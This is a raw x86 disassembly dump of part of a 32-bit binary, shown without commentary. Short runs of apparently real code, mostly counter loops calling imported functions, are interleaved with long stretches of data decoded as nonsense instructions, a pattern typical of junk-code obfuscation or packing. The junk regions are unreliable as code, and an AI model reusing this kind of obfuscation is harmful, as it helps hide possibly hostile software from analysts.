  408380:	mov    DWORD PTR ds:0x4245ca,ecx
  408386:	jmp    0x40833a
  40838b:	inc    DWORD PTR ds:0x412370
  408391:	mov    ecx,DWORD PTR [ebp+0x8]
  408394:	and    DWORD PTR ds:0x417e55,0x0
  40839e:	jmp    0x4083b1
  4083a3:	xor    eax,eax
  4083a5:	or     eax,DWORD PTR ds:0x417e55
  4083ab:	inc    eax
  4083ac:	mov    ds:0x417e55,eax
  4083b1:	cmp    DWORD PTR ds:0x417e55,0x1f
  4083b8:	jae    0x4083df
  4083be:	cmp    DWORD PTR ds:0x417e55,0x21
  4083c5:	jne    0x4083d4
  4083cb:	push   DWORD PTR [ebp-0x14]
  4083ce:	call   DWORD PTR ds:0x40d008
  4083d4:	jmp    0x4083a3
  4083d9:	sub    DWORD PTR ds:0x4245ca,edi
  4083df:	mov    eax,0x8a43
  4083e4:	sub    DWORD PTR ds:0x415101,0x2da0
  4083ee:	jmp    0x408517
  4083f3:	dec    ecx
  4083f4:	pushf  
  4083f5:	push   esp
  4083f6:	in     eax,dx
  4083f7:	imul   esp,ebp,0x9f63b859
  4083fd:	mov    DWORD PTR [ebx+edx*4+0x61c1b565],ebp
  408404:	adc    al,0x7e
  408406:	jle    0x408412
  408408:	jg     0x408488
  40840a:	jle    0x408404
  40840c:	pop    edi
  40840d:	sbb    bl,BYTE PTR [ebp+0x7d0fcab6]
  408413:	jo     0x40842f
  408415:	cmp    eax,0x1ac82884
  40841a:	jp     0x4083f8
  40841c:	icebp  
  40841d:	xchg   eax,edi
  40841f:	push   es
  408420:	fisubr DWORD PTR [eax]
  408422:	lods   eax,DWORD PTR ds:[esi]
  408423:	out    dx,al
  408424:	clc    
  408425:	add    BYTE PTR [ebx],al
  408427:	bound  eax,QWORD PTR [edi+0x51]
  40842a:	and    ch,BYTE PTR [esi-0x2e353c9e]
  408430:	pop    esi
  408431:	cld    
  408432:	ds data16 xor ch,bl
  408436:	jae    0x4083da
  408438:	in     al,0xc8
  40843a:	jg     0x4083d9
  40843c:	out    0xb3,al
  40843e:	pop    ebx
  40843f:	sub    al,0x17
  408441:	xchg   edx,eax
  408442:	or     BYTE PTR [edi],0xa4
  408445:	and    al,0x6c
  408447:	sbb    ch,BYTE PTR [edi+0x51]
  40844a:	imul   ebx,DWORD PTR [ecx-0x311bfc65],0x5df3f204
  408454:	jecxz  0x4084d5
  408456:	or     al,0x2b
  408458:	pop    ebp
  408459:	inc    esi
  40845a:	jge    0x40849a
  40845c:	mov    ds:0x9fec3d8c,eax
  408461:	mov    esi,DWORD PTR [eax+0x77]
  408464:	xchg   DWORD PTR [esi+0x78],esi
  408467:	sub    al,0x9a
  408469:	(bad)  
  40846a:	dec    ebp
  40846b:	sar    edi,0xfd
  40846e:	cmp    DWORD PTR [edi-0x7db04cbb],ebp
  408474:	sti    
  408475:	ja     0x408490
  408477:	outs   dx,BYTE PTR ds:[esi]
  408478:	and    DWORD PTR [ecx+eax*4+0x2bc23b63],ebx
  40847f:	adc    al,0x9b
  408481:	pop    ss
  408482:	mov    dl,0xda
  408484:	inc    edi
  408485:	xlat   BYTE PTR ds:[ebx]
  408486:	cs push ss
  408488:	mov    ch,0xde
  40848a:	or     DWORD PTR [esi+ecx*8+0x3],ecx
  40848e:	xlat   BYTE PTR ds:[ebx]
  40848f:	data16 (bad) 
  408491:	jnp    0x4084c6
  408493:	les    edx,FWORD PTR [ebp+edx*8-0x76b07309]
  40849a:	cs loopne 0x40841d
  40849d:	out    0x31,eax
  40849f:	(bad)  
  4084a0:	xchg   ebp,eax
  4084a1:	in     al,0x0
  4084a3:	jecxz  0x408490
  4084a5:	mov    edi,0xb6acaf92
  4084aa:	fistp  WORD PTR [edi+0x124a4dff]
  4084b0:	push   0x5fb8de2e
  4084b5:	imul   ecx,DWORD PTR [edi+0x1b0874ce],0xed801d98
  4084bf:	add    al,ch
  4084c1:	lds    esi,FWORD PTR [ebx-0x27a541e7]
  4084c7:	mov    esp,DWORD PTR [ecx]
  4084c9:	sub    edi,DWORD PTR [eax-0x457e710e]
  4084cf:	inc    ecx
  4084d0:	std    
  4084d1:	(bad)  
  4084d2:	fmulp  st(0),st
  4084d4:	sbb    bl,BYTE PTR gs:[ecx-0x6a]
  4084d8:	adc    al,bh
  4084da:	xchg   DWORD PTR [ecx-0x3b95a873],edi
  4084e0:	inc    ebx
  4084e1:	test   BYTE PTR [edx-0x59],cl
  4084e4:	scas   eax,DWORD PTR es:[edi]
  4084e5:	ins    DWORD PTR es:[edi],dx
  4084e6:	mov    gs,esp
  4084e8:	cmp    DWORD PTR [ecx-0x43d52713],ebx
  4084ee:	mov    al,0x70
  4084f0:	add    eax,0x74d2848b
  4084f5:	(bad)  
  4084f7:	leave  
  4084f8:	jg     0x4084e3
  4084fa:	popf   
  4084fb:	pop    esi
  4084fc:	add    BYTE PTR [edx+edi*2+0x58],dh
  408500:	xor    cl,ch
  408502:	xchg   ebx,eax
  408503:	mov    ecx,0xd0210059
  408508:	fdiv   QWORD PTR [eax+0x6762f05e]
  40850e:	pop    ecx
  40850f:	(bad)  
  408510:	clc    
  408511:	mov    ds:0x36f0113c,eax
  408516:	dec    ecx
  408517:	xor    ax,WORD PTR [ecx+0x20]
  40851b:	mov    ecx,0x3b0a
  408520:	not    DWORD PTR ds:0x41abce
  408526:	add    ax,cx
  408529:	mov    ecx,DWORD PTR ds:0x417e49
  40852f:	or     ecx,DWORD PTR ds:0x412374
  408535:	mov    DWORD PTR ds:0x417e49,ecx
  40853b:	jmp    0x408664
  408540:	sub    cl,BYTE PTR [ebp-0x31]
  408543:	xchg   esp,eax
  408544:	jns    0x4084da
  408546:	jns    0x408589
  408548:	or     eax,0xc926a896
  40854d:	inc    eax
  40854e:	std    
  40854f:	(bad)  
  408550:	jge    0x40857c
  408552:	jle    0x4085d2
  408554:	or     bh,BYTE PTR [edi+0x7e]
  408557:	jle    0x4085bd
  408559:	(bad)  
  40855a:	pusha  
  40855b:	es mov esp,0xf89a9af3
  408561:	inc    esi
  408562:	dec    ebx
  408563:	inc    ecx
  408564:	int    0x38
  408566:	mov    cl,0xf6
  408568:	pop    ds
  408569:	adc    al,0x68
  40856b:	out    dx,al
  40856c:	test   DWORD PTR ds:0xdf9630bf,esi
  408572:	imul   ebp,DWORD PTR [eax+0x19dc67ab],0xffffffbc
  408579:	push   ss
  40857a:	stos   DWORD PTR es:[edi],eax
  40857b:	mov    dh,BYTE PTR [esi-0x48]
  40857e:	aad    0xb
  408580:	sbb    eax,0xc836d910
  408585:	retf   
  408586:	sub    DWORD PTR [edi-0x4a],eax
  408589:	adc    BYTE PTR [ebx],0xd9
  40858c:	push   0xcd4b2cb8
  408591:	in     al,dx
  408592:	jno    0x4085b3
  408594:	and    eax,DWORD PTR [esi+0x37277d46]
  40859a:	cld    
  40859b:	aam    0x1a
  40859d:	inc    esi
  40859e:	sub    cl,BYTE PTR [ecx+0x5bca1bee]
  4085a4:	adc    eax,0xb32ce484
  4085a9:	mov    eax,0xe9c0ad1d
  4085ae:	cmp    al,0x9e
  4085b0:	cdq    
  4085b1:	pop    esp
  4085b2:	or     al,0x6e
  4085b4:	enter  0xf16c,0xd4
  4085b8:	pop    ss
  4085b9:	aas    
  4085ba:	ins    DWORD PTR es:[edi],dx
  4085bb:	adc    al,0xfd
  4085bd:	add    BYTE PTR [ebx],ah
  4085bf:	cmp    ch,BYTE PTR [edx+0x8]
  4085c2:	mov    ah,0xba
  4085c4:	enter  0x79c6,0x90
  4085c8:	xchg   ebx,eax
  4085c9:	stos   DWORD PTR es:[edi],eax
  4085ca:	and    eax,DWORD PTR [ebp-0x52]
  4085cd:	sbb    DWORD PTR [ebp*4-0x10802075],ebx
  4085d4:	in     al,0xdf
  4085d6:	dec    eax
  4085d7:	daa    
  4085d8:	stos   DWORD PTR es:[edi],eax
  4085d9:	mov    dh,0xee
  4085db:	xchg   ebx,eax
  4085dc:	(bad)  
  4085de:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085e0:	push   edi
  4085e1:	cli    
  4085e2:	frndint 
  4085e4:	stc    
  4085e5:	push   edi
  4085e6:	dec    BYTE PTR [ecx-0x236570ca]
  4085ec:	cli    
  4085ed:	sar    BYTE PTR [ecx-0x73b37c8],1
  4085f3:	adc    eax,0x4951b615
  4085f8:	loope  0x4085ce
  4085fa:	xlat   BYTE PTR ds:[ebx]
  4085fb:	and    ebx,DWORD PTR [esi+0x13]
  4085fe:	mov    ebx,0x2c31bc77
  408603:	and    eax,0xfb6e0bd1
  408608:	xchg   edx,eax
  408609:	pusha  
  40860a:	jno    0x40861f
  40860c:	lahf   
  40860d:	mov    dh,0xe1
  40860f:	pop    ecx
  408610:	xor    ebx,DWORD PTR [ebx+0x3d8a1c74]
  408616:	jge    0x4085a0
  408618:	ret    0x2001
  40861b:	cmp    al,0x8f
  40861d:	shl    BYTE PTR [ebx],0xde
  408620:	or     esp,DWORD PTR [ebx]
  408622:	(bad)  
  408623:	bound  edx,QWORD PTR [eax-0x69338d30]
  408629:	ss aad 0x74
  40862c:	mul    BYTE PTR gs:[edi+0x3c5e9d74]
  408633:	push   ds
  408634:	mov    dh,0x52
  408636:	je     0x4086a6
  408638:	ja     0x408600
  40863a:	mov    WORD PTR [edi],ss
  40863c:	and    bh,ah
  40863e:	sub    al,0xf2
  408640:	mov    ds:0x96efee7c,al
  408645:	pop    ds
  408646:	adc    DWORD PTR [ecx],esp
  408648:	or     DWORD PTR [edi+0x15e44d4e],esi
  40864e:	cmc    
  40864f:	jl     0x40869c
  408651:	ja     0x4085f7
  408653:	sbb    eax,0x6bc91907
  408658:	imul   ebp,DWORD PTR [eax],0x5
  40865b:	jns    0x408671
  40865d:	cmp    DWORD PTR [esi-0x4063f268],ebx
  408663:	or     DWORD PTR [edi],ecx
  408665:	mov    bh,0xc0
  408667:	add    ecx,DWORD PTR ds:0x417e49
  40866d:	mov    DWORD PTR [ebp-0xc],eax
  408670:	mov    BYTE PTR [ebp-0x1],0x7f
  408674:	lea    eax,[ebp-0x1]
  408677:	and    DWORD PTR ds:0x4245c6,edx
  40867d:	mov    DWORD PTR [ebp-0x10],eax
  408680:	mov    DWORD PTR ds:0x41510d,0x1a
  40868a:	cmp    DWORD PTR ds:0x41510d,0x0
  408691:	je     0x4086bf
  408697:	cmp    DWORD PTR ds:0x41510d,0x25
  40869e:	jne    0x4086ad
  4086a4:	push   DWORD PTR [ebp-0x18]
  4086a7:	call   DWORD PTR ds:0x40d370
  4086ad:	mov    ecx,DWORD PTR ds:0x41510d
  4086b3:	dec    ecx
  4086b4:	mov    DWORD PTR ds:0x41510d,ecx
  4086ba:	jmp    0x40868a
  4086bf:	mov    al,BYTE PTR [ebp-0x1]
  4086c2:	and    DWORD PTR ds:0x4150fd,0x0
  4086cc:	mov    ecx,DWORD PTR ds:0x4150fd
  4086d2:	inc    ecx
  4086d3:	mov    DWORD PTR ds:0x4150fd,ecx
  4086d9:	cmp    DWORD PTR ds:0x4150fd,0x11
  4086e0:	jne    0x4086f1
  4086e6:	push   0x41ad87
  4086eb:	call   DWORD PTR ds:0x40d1e4
  4086f1:	cmp    DWORD PTR ds:0x4150fd,0x10
  4086f8:	jne    0x40870b
  4086fe:	mov    ecx,DWORD PTR ds:0x4150fd
  408704:	inc    ecx
  408705:	mov    DWORD PTR ds:0x4150fd,ecx
  40870b:	cmp    DWORD PTR ds:0x4150fd,0x1f
  408712:	jb     0x4086cc
  408718:	neg    ecx
  40871a:	mov    ecx,DWORD PTR [ebp-0x10]
  40871d:	xor    al,0x4a
  40871f:	or     DWORD PTR ds:0x41abe2,0x415105
  408729:	sub    al,0x34
  40872b:	mov    BYTE PTR [ecx],al
  40872d:	xor    ecx,ecx
  40872f:	jmp    0x408858
  408734:	adc    DWORD PTR [ebx+0xc],ebx
  408737:	(bad)  
  408738:	fs pop ecx
  40873a:	jmp    0x44b4d3b8
  40873f:	(bad)  
  408741:	mov    bh,0x7e
  408743:	(bad)  
  408744:	or     DWORD PTR [ebx],ebp
  408746:	jle    0x4087c6
  408748:	or     bh,BYTE PTR [edi+0x7e]
  40874b:	jle    0x4087b1
  40874d:	scas   al,BYTE PTR es:[edi]
  40874e:	pop    edx
  40874f:	cmp    DWORD PTR [esi],ecx
  408751:	mov    dl,0xd
  408753:	pusha  
  408754:	adc    eax,0x6dccd738
  408759:	and    DWORD PTR [edi-0x41],eax
  40875c:	(bad)  [ebp-0x1367e2e7]
  408762:	hlt    
  408763:	xchg   edx,eax
  408764:	sbb    al,0x9d
  408766:	rcr    DWORD PTR [ecx],1
  408768:	jb     0x408712
  40876a:	cmp    al,0x87
  40876c:	xor    ch,BYTE PTR [ecx]
  40876e:	adc    dl,BYTE PTR [ebx+0x5c]
  408771:	dec    ecx
  408772:	dec    edx
  408773:	mov    eax,ds:0xc1192d9c
  408778:	and    ecx,DWORD PTR [eax+0x29]
  40877b:	jbe    0x408714
  40877d:	cmp    BYTE PTR [esi-0xc6b783],bl
  408783:	xor    ch,BYTE PTR [ebx]
  408785:	cmp    ch,bl
  408787:	idiv   dh
  408789:	aam    0x57
  40878b:	xlat   BYTE PTR ds:[ebx]
  40878c:	gs xchg esi,eax
  40878e:	test   eax,0x79f6625a
  408793:	(bad)
  408797:	call   0x5357:0x8292239f
  40879e:	js     0x4087a4
  4087a0:	inc    esp
  4087a1:	sbb    al,0xfd
  4087a3:	push   ss
  4087a4:	add    BYTE PTR [eax],0xe1
  4087a7:	in     eax,dx
  4087a8:	mov    cl,0x26
  4087aa:	dec    ebp
  4087ab:	gs push ss
  4087ad:	mov    BYTE PTR [esp+ebp*4],bh
  4087b0:	cwde   
  4087b1:	jns    0x4087b5
  4087b3:	fist   WORD PTR [eax-0x3e]
  4087b6:	fst    DWORD PTR [eax]
  4087b8:	call   0x7fe7:0x96879cff
  4087bf:	gs or  eax,0xd37875fe
  4087c5:	(bad)  
  4087c6:	inc    esi
  4087c7:	mov    esp,0xc4cd33b8
  4087cc:	cmp    al,0xb8
  4087ce:	cld    
  4087cf:	inc    edx
  4087d0:	clc    
  4087d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087d2:	dec    edx
  4087d3:	idiv   BYTE PTR [eax]
  4087d5:	dec    edi
  4087d6:	jb     0x408792
  4087d8:	mov    ecx,0x6b4f0642
  4087dd:	jmp    0x52be:0x5e90
  4087e3:	fucomp st(7)
  4087e5:	jo     0x40877c
  4087e7:	push   edi
  4087e8:	xchg   ecx,eax
  4087e9:	out    dx,al
  4087ea:	stc    
  4087eb:	clc    
  4087ec:	push   ebp
  4087ed:	inc    esp
  4087ee:	bound  edx,QWORD PTR [ebp-0x45ae3bae]
  4087f4:	xchg   esi,eax
  4087f5:	cmc    
  4087f6:	loopne 0x40881a
  4087f8:	pop    ebp
  4087f9:	ds pop edx
  4087fb:	push   ebx
  4087fc:	fidivr DWORD PTR [edx]
  4087fe:	adc    ecx,DWORD PTR [edx-0x6d]
  408801:	or     bl,dh
  408803:	dec    esp
  408804:	(bad)  
  408805:	dec    DWORD PTR [edi]
  408807:	cmp    DWORD PTR [edi+0x21f49b93],eax
  40880d:	(bad)  
  40880e:	mov    cl,0x3b
  408810:	push   ecx
  408811:	cmp    DWORD PTR [ebp-0x663e7176],eax
  408817:	sahf   
  408818:	inc    edi
  408819:	in     eax,0x3
  40881b:	sbb    eax,0xeeedf1d7
  408820:	mov    esp,0x659a0d44
  408825:	push   eax
  408826:	mov    bh,0x4
  408828:	pop    es
  408829:	or     ebx,DWORD PTR [edi]
  40882b:	cmp    cl,dh
  40882d:	pusha  
  40882e:	(bad)  [esi]
  408830:	shl    BYTE PTR [edi],0x32
  408833:	jne    0x408813
  408835:	jnp    0x4087f3
  408837:	mov    WORD PTR [edx],?
  408839:	pop    esp
  40883a:	pop    ss
  40883b:	nop
  40883c:	cmp    ch,BYTE PTR [ecx-0x41]
  40883f:	lds    edx,FWORD PTR [edi+0x64]
  408842:	jmp    0x151d:0xeadd34c4
  408849:	scas   al,BYTE PTR es:[edi]
  40884a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40884b:	push   es
  40884c:	fnstenv [edi-0x10888b3f]
  408852:	inc    edi
  408853:	das    
  408854:	cwde   
  408855:	pop    ds
  408856:	dec    ecx
  408857:	das    
  408858:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40885f:	adc    DWORD PTR ds:0x412370,0x1786
  408869:	mov    DWORD PTR [ebp-0x10],0xf89c853b
  408870:	mov    eax,DWORD PTR [ebp-0x8]
  408873:	xor    ecx,ecx
  408875:	add    ecx,DWORD PTR ds:0x417e59
  40887b:	sbb    DWORD PTR ds:0x41abde,ecx
  408881:	mov    ecx,0x7510859
  408886:	add    DWORD PTR ds:0x41abe6,0x417e51
  408890:	push   esi
  408891:	and    DWORD PTR ds:0x417e59,0x0
  40889b:	mov    esi,DWORD PTR ds:0x417e59
  4088a1:	inc    esi
  4088a2:	mov    DWORD PTR ds:0x417e59,esi
  4088a8:	cmp    DWORD PTR ds:0x417e59,0x9
  4088af:	jne    0x4088f1
  4088b5:	push   0x41ad06
  4088ba:	push   DWORD PTR [ebp-0x10]
  4088bd:	push   DWORD PTR [ebp-0x14]
  4088c0:	push   0x6f38
  4088c5:	push   0x208a
  4088ca:	push   0x8fdb
  4088cf:	push   0x1d69
  4088d4:	push   DWORD PTR [ebp-0x20]
  4088d7:	push   0x57cc
  4088dc:	push   DWORD PTR [ebp-0x10]
  4088df:	push   DWORD PTR [ebp-0x28]
  4088e2:	push   DWORD PTR [ebp-0x24]
  4088e5:	push   DWORD PTR [ebp-0x28]
  4088e8:	push   DWORD PTR [ebp-0x1c]
  4088eb:	call   DWORD PTR ds:0x40d374
  4088f1:	cmp    DWORD PTR ds:0x417e59,0x8
  4088f8:	jne    0x40890d
  4088fe:	xor    esi,esi
  408900:	add    esi,DWORD PTR ds:0x417e59
  408906:	inc    esi
  408907:	mov    DWORD PTR ds:0x417e59,esi
  40890d:	cmp    DWORD PTR ds:0x417e59,0x13
  408914:	jb     0x40889b
  40891a:	xor    eax,ecx
  40891c:	mov    esi,0x32729f
  408921:	add    eax,esi
  408923:	jmp    0x408930
  408928:	mov    dl,BYTE PTR [ebp-0x1]
  40892b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40892f:	inc    eax
  408930:	cmp    eax,0x40
  408933:	jb     0x408928
  408939:	mov    edx,DWORD PTR [ebp-0x8]
  40893c:	mov    eax,DWORD PTR [ebp-0xc]
  40893f:	jmp    0x408a68
  408944:	sub    eax,0xb98f82f6
  408949:	fwait
  40894a:	and    DWORD PTR [eax+eax*1-0x2228be99],edx
  408951:	divps  xmm1,XMMWORD PTR [ecx]
  408954:	add    eax,0xa7e7e28
  408959:	jg     0x4089d9
  40895b:	jle    0x4088de
  40895d:	jp     0x408928
  40895f:	cli    
  408960:	por    mm1,QWORD PTR [ebx+0x71]
  408964:	mov    gs,WORD PTR [ebx-0x5b2904f6]
  40896a:	bound  esp,QWORD PTR [eax+ecx*1+0xe]
  40896e:	and    edi,ebx
  408970:	and    al,0xe3
  408972:	icebp  
  408973:	xor    DWORD PTR [edi+0x20],ebx
  408976:	and    ah,al
  408978:	inc    esi
  408979:	xor    DWORD PTR [edi+eiz*8+0x7b],0x16
  40897e:	jle    0x40898d
  408980:	in     al,dx
  408981:	aad    0xf2
  408983:	mov    BYTE PTR [eax],dl
  408985:	xor    DWORD PTR [edx-0x77],ebp
  408988:	jmp    0x4089cd
  40898a:	test   ch,bh
  40898c:	dec    esp
  40898d:	in     eax,0xe6
  40898f:	sub    eax,0xb53e16ac
  408994:	push   esi
  408995:	dec    ebx
  408996:	sbb    edx,DWORD PTR [ebp+eax*8-0x6b]
  40899a:	jg     0x4089cf
  40899c:	xchg   edx,eax
  40899d:	and    eax,0x82c07614
  4089a2:	arpl   ax,dx
  4089a4:	cmp    eax,0x64d2e46d
  4089a9:	jo     0x4089a2
  4089ab:	add    BYTE PTR [edx],bh
  4089ad:	push   ds
  4089ae:	mov    al,ds:0x3f2a3b34
  4089b3:	dec    ebp
  4089b4:	adc    DWORD PTR ds:0x30507d5f,esp
  4089ba:	and    al,0xcb
  4089bc:	enter  0xf0bd,0xd2
  4089c0:	div    DWORD PTR [esi-0x1d25322d]
  4089c6:	jb     0x4089e1
  4089c8:	xor    al,0xf7
  4089ca:	fwait
  4089cb:	in     eax,dx
  4089cc:	xor    esp,DWORD PTR [edi+0x3ac9ebfa]
  4089d2:	aad    0x3d
  4089d4:	jns    0x40899b
  4089d6:	dec    ebp
  4089d7:	sub    ebp,DWORD PTR [edi-0x59606646]
  4089dd:	data16 cmp al,0x95
  4089e0:	adc    ch,cl
  4089e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089e3:	aam    0xf1
  4089e5:	rcl    DWORD PTR [ebp+0x33],cl
  4089e8:	mov    dl,cl
  4089ea:	inc    esi
  4089eb:	cmp    BYTE PTR [edx],0x9d
  4089ee:	outs   dx,DWORD PTR ds:[esi]
  4089ef:	shr    DWORD PTR [eax],1
  4089f1:	and    edi,DWORD PTR [ecx]
  4089f3:	out    dx,eax
  4089f4:	icebp  
  4089f5:	outs   dx,DWORD PTR ds:[esi]
  4089f6:	sub    bh,BYTE PTR [edx]
  4089f8:	mov    cl,0xe7
  4089fa:	jg     0x408a24
  4089fc:	cdq    
  4089fd:	adc    DWORD PTR [esp+edx*2+0x6b],ebx
  408a01:	mov    al,ds:0xd86801fb
  408a06:	mov    edi,0x27ad4030
  408a0b:	fstp   QWORD PTR [esi+ebx*1-0x67cab33c]
  408a12:	adc    dh,BYTE PTR ss:[eax+0x6fe9312c]
  408a19:	dec    dh
  408a1b:	stos   DWORD PTR es:[edi],eax
  408a1c:	lahf   
  408a1d:	jnp    0x4089db
  408a1f:	lods   eax,DWORD PTR ds:[esi]
  408a20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a22:	and    eax,0x309dfd21
  408a27:	adc    BYTE PTR [ebx-0x1980f1f7],bh
  408a2d:	mov    bl,0x17
  408a2f:	add    eax,0x78671379
  408a34:	mov    dl,0xbc
  408a36:	sbb    cl,dl
  408a38:	add    BYTE PTR [ecx-0x3b5c0b1c],ch
  408a3e:	mov    eax,DWORD PTR [ebx]
  408a40:	pop    esp
  408a41:	mov    dh,0x4f
  408a43:	dec    edi
  408a44:	iret   
  408a45:	mov    edi,0x8fa6954b
  408a4a:	cmp    WORD PTR [esp+ebp*1+0x219d84f8],0x8b52
  408a54:	addr16 mov ebp,0xa58504fb
  408a5a:	faddp  st(4),st
  408a5c:	mov    al,0xe5
  408a5e:	mov    esp,0x43d8613e
  408a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a64:	cs fstp st(5)
  408a67:	dec    ebx
  408a68:	xor    edx,ecx
  408a6a:	add    edx,esi
  408a6c:	cmp    edx,eax
  408a6e:	je     0x408d06
  408a74:	jmp    0x408b9d
  408a79:	xor    ecx,DWORD PTR [edx+ebx*1-0x14]
  408a7d:	cdq    
  408a7e:	js     0x408a69
  408a80:	popa   
  408a81:	cmp    ax,0xba8d
  408a85:	mov    bh,BYTE PTR [edi]
  408a87:	das    
  408a88:	ficom  DWORD PTR [ecx]
  408a8a:	sub    DWORD PTR [esi+0x7e],edi
  408a8d:	or     bh,BYTE PTR [edi+0x7e]
  408a90:	jle    0x408b06
  408a92:	(bad)  
  408a93:	mov    ds:0x5d0044df,al
  408a98:	add    esi,DWORD PTR [ebx+ebp*2]
  408a9b:	(bad)
  408a9f:	cmp    ebx,DWORD PTR [eax+ecx*4]
  408aa2:	jmp    0x408a69
  408aa4:	test   al,0xae
  408aa6:	sbb    ah,BYTE PTR [ecx-0x542c5691]
  408aac:	push   ebp
  408aad:	add    ebp,edx
  408aaf:	xchg   edi,eax
  408ab0:	cmp    eax,edx
  408ab2:	jno    0x408aba
  408ab4:	or     DWORD PTR [ebp-0x3b6444ca],ebx
  408aba:	or     al,0xa8
  408abc:	sbb    eax,0x4c4cf151
  408ac1:	in     eax,0xff
  408ac3:	in     al,0xcf
  408ac5:	inc    eax
  408ac6:	fcom   DWORD PTR [ebx-0x3e0feb90]
  408acc:	add    ebp,edi
  408ace:	loope  0x408b39
  408ad0:	pop    ebp
  408ad1:	adc    DWORD PTR [ebx],ecx
  408ad3:	mov    al,0x5f
  408ad5:	outs   dx,BYTE PTR ds:[esi]
  408ad6:	outs   dx,BYTE PTR ds:[esi]
  408ad7:	push   eax
  408ad8:	mov    al,ds:0xffa069cd
  408add:	xor    DWORD PTR ds:0x4c289919,ecx
  408ae3:	cld    
  408ae4:	rol    BYTE PTR [ebp+edi*1-0x37],1
  408ae8:	jmp    0xc1f4b43c
  408aed:	aam    0x7c
  408aef:	mov    BYTE PTR [esi+0x6d],dl
  408af2:	pusha  
  408af3:	adc    esi,ebp
  408af5:	out    dx,eax
  408af6:	stos   DWORD PTR es:[edi],eax
  408af7:	not    DWORD PTR [ecx-0x29]
  408afa:	fld    TBYTE PTR [edi+0x59]
  408afd:	jle    0x408a9b
  408aff:	fbld   TBYTE PTR [esi-0x9]
  408b02:	adc    DWORD PTR [ebp+ebp*8+0xc],ecx
  408b06:	cmp    eax,0x87ebd9c4
  408b0b:	and    DWORD PTR ds:0xa420e6a0,ecx
  408b11:	push   ebx
  408b12:	adc    DWORD PTR [ebp+0x79],eax
  408b15:	(bad)  
  408b16:	push   cs
  408b17:	lods   al,BYTE PTR ds:[esi]
  408b18:	retf   0xb0a1
  408b1b:	push   es
  408b1c:	jecxz  0x408aed
  408b1e:	cmp    bl,cl
  408b20:	daa    
  408b21:	popf   
  408b22:	inc    esp
  408b23:	jmp    0xc7b2:0xa550cce0
  408b2a:	inc    esi
  408b2b:	mov    eax,0x5b1dad6e
  408b30:	push   cs
  408b31:	sub    esi,DWORD PTR [edx-0x25b19329]
  408b37:	xchg   edi,eax
  408b38:	jmp    FWORD PTR [esi+0x3122a4]
  408b3e:	fst    st(4)
  408b40:	aam    0xf3
  408b42:	push   cs
  408b43:	push   ds
  408b44:	mov    ah,0x6c
  408b46:	rol    DWORD PTR [esi-0x3154947],cl
  408b4c:	or     al,al
  408b4e:	stc    
  408b4f:	imul   edi,DWORD PTR [edi+0x107241fd],0x1270b4ad
  408b59:	fisubr DWORD PTR [eax+0x6c4d6fc4]
  408b5f:	cwde   
  408b60:	ret    0x758a
  408b63:	lods   al,BYTE PTR ds:[esi]
  408b64:	pop    esi
  408b65:	(bad)  
  408b66:	loope  0x408b87
  408b68:	push   edi
  408b69:	xchg   edi,eax
  408b6a:	popa   
  408b6b:	inc    eax
  408b6c:	xchg   esi,eax
  408b6d:	ins    DWORD PTR es:[edi],dx
  408b6e:	mov    bh,0xd4
  408b70:	fidivr DWORD PTR [eax+0x28]
  408b73:	enter  0x9eb1,0xea
  408b77:	loop   0x408afd
  408b79:	inc    ecx
  408b7b:	and    BYTE PTR [eax+0x223f94df],bh
  408b81:	mov    ds:0x38272d2e,al
  408b86:	jne    0x408b32
  408b88:	push   edx
  408b89:	sti    
  408b8a:	inc    esp
  408b8b:	jecxz  0x408b3d
  408b8d:	icebp  
  408b8e:	mov    ds:0x504b1385,al
  408b93:	pop    ebx
  408b94:	aam    0x48
  408b96:	pop    edi
  408b97:	xor    eax,0x18b7521c
  408b9c:	rcl    DWORD PTR [ebx+0x57],0x8b
  408ba0:	jge    0x408baa
  408ba2:	mov    eax,0x8a43
  408ba7:	xor    ax,WORD PTR [edi+edx*4+0x2]
  408bac:	mov    edi,0x3b0a
  408bb1:	add    ax,di
  408bb4:	movzx  eax,ax
  408bb7:	mov    DWORD PTR [ebp-0x14],eax
  408bba:	mov    eax,DWORD PTR [ebp+0x8]
  408bbd:	jmp    0x408ce6
  408bc2:	(bad)  
  408bc3:	fcom   DWORD PTR [edx+eax*8]
  408bc6:	sub    dl,ah
  408bc8:	clc    
  408bc9:	fcomp  DWORD PTR [ebx-0x1eec9643]
  408bcf:	mov    edx,0x2e2d2157
  408bd4:	jle    0x408c54
  408bd6:	or     bh,BYTE PTR [edi+0x7e]
  408bd9:	jle    0x408c33
  408bdb:	scas   al,BYTE PTR es:[edi]
  408bdc:	data16 (bad) 
  408bde:	jecxz  0x408c2e
  408be0:	ja     0x408bc8
  408be2:	or     DWORD PTR [ebx+0x7bd42fa3],0x33
  408be9:	mov    esp,0x28e9269f
  408bee:	fld    TBYTE PTR [ecx+0x233d6580]
  408bf4:	(bad)  
  408bf5:	jg     0x408b9f
  408bf7:	jg     0x408c29
  408bf9:	xchg   edx,ebp
  408bfb:	mov    ch,0x17
  408bfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bfe:	mov    ah,0xcd
  408c00:	xor    eax,0x41a617de
  408c05:	mov    BYTE PTR [ebx+eiz*8+0x4c],0x22
  408c0a:	push   esi
  408c0b:	pslld  mm4,QWORD PTR [ecx+0x45e02122]
  408c12:	into   
  408c13:	pop    ecx
  408c14:	sbb    al,0x3a
  408c16:	js     0x408bb9
  408c18:	and    esi,esp
  408c1a:	das    
  408c1b:	xchg   ecx,eax
  408c1c:	add    BYTE PTR [eax+0x36],dh
  408c1f:	mov    al,ds:0x2aba2004
  408c24:	bound  ebp,QWORD PTR [esi+edi*1]
  408c27:	xchg   ecx,eax
  408c28:	mov    cl,0xe4
  408c2a:	(bad)  [esi-0x67]
  408c2d:	sbb    al,0x10
  408c2f:	pop    edx
  408c30:	pop    ss
  408c31:	push   eax
  408c32:	fwait
  408c33:	xor    ebx,DWORD PTR [esi+0x43f28974]
  408c39:	aas    
  408c3a:	add    edx,edx
  408c3c:	popa   
